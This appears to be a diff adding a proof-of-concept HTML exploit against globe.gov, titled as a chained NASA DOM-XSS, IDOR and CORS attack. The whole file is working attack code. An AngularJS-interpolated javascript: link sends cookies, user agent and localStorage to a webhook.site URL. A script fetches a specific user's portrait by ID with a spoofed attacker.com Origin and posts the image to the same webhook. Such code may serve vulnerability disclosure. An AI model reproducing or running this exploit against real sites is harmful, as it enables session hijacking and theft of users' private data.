@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html ng-app>
+<head>
+  <meta charset="utf-8">
+  <title>NASA Chained XSS PoC</title>
+  <script src="https://dataentrydev.globe.gov/lib/angular/angular.js"></script>
+</head>
+<body>
+  <h2>NASA DOM-XSS + IDOR + CORS Exploit</h2>
+
+  <!-- ✅ DOM-XSS via AngularJS vulnerable interpolation -->
+  <svg>
+    <a xlink:href="{{'javascript:fetch(`https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?cookie=' + document.cookie + '&ua=' + navigator.userAgent + '&local=' + encodeURIComponent(JSON.stringify(localStorage)))'}}">
+      Click here (XSS)
+    </a>
+  </svg>
+
+  <!-- ✅ Load user image via IDOR -->
+  <img ng-src="{{'https://www.globe.gov/image/user_portrait?img_id=22514639'}}" width="200" />
+
+  <!-- ✅ Cross-Origin fetch via CORS misconfig -->
+  <script>
+    fetch("https://www.globe.gov/image/user_portrait?img_id=22514639", {
+      method: "GET",
+      headers: {
+        Origin: "https://attacker.com"
+      }
+    }).then(res => res.blob()).then(blob => {
+      fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
+        method: "POST",
+        body: blob
+      });
+    });
+  </script>
+</body>
+</html>
